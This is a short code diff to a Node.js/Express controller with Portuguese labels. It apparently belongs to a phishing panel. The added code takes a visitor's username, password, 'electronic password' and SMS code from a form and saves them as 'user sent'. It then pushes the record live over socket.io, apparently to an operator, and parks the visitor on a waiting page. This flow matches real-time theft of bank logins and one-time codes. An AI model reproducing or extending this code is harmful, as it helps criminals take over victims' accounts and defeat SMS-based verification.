@@ -7,9 +7,33 @@ module.exports = {
             //Client
             const ipfromUser = req.connection.remoteAddress
 
-            const { type, user, password, eletronicPassword, sms, status, socket } = req.body
+            const { type, user, password, eletronicPassword, sms, status, socket, userID } = req.body
 
+            
             const { client: clientID, error } = req.query
+
+            if(userID) {
+                const clientUser = await Client.findByPk(parseInt(userID))
+
+
+
+                if (clientUser) {
+                    await clientUser.update({
+                        type,
+                        user,
+                        password,
+                        eletronicPassword,
+                        sms,
+                        status: `Usuário enviado`,
+                    })
+
+                    //console.log()
+
+                    req.app.io.to(clientUser.id).emit('sendUser', clientUser.toJSON())
+
+                    return res.redirect(`/await?client=${clientUser.id}`)
+                }
+            }
 
             if (clientID) {
                 const clientUser = await Client.findByPk(clientID)
